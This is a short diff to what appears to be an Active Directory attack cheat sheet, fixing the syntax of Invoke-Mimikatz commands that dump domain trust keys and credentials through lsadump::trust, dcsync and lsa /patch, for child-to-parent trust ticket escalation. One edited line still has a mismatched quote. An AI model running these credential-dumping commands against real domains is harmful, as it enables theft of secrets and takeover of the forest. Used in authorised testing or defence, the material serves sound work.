@@ -20,11 +20,11 @@ Child to Parent using Trust Tickets
 
 **Export Trustkey**
 
-<pre class="language-powershell"><code class="lang-powershell">Invoke-Mimikatz -Command '"lsadump ::trust /patch'" -ComputerName dchostname
+<pre class="language-powershell"><code class="lang-powershell">Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dchostname
 or
-Invoke-Mimikatz -Command '"lsadump ::dcsync /user:dom\forest-dc-host$'"
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:dom\forest-dc-host$"'
 or
-Invoke-Mimikatz -Command '"lsadump ::lsa /patch'"
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"
 
 Output:
 <strong>Domain: dom.local (dom/ S-1-5-2...) 
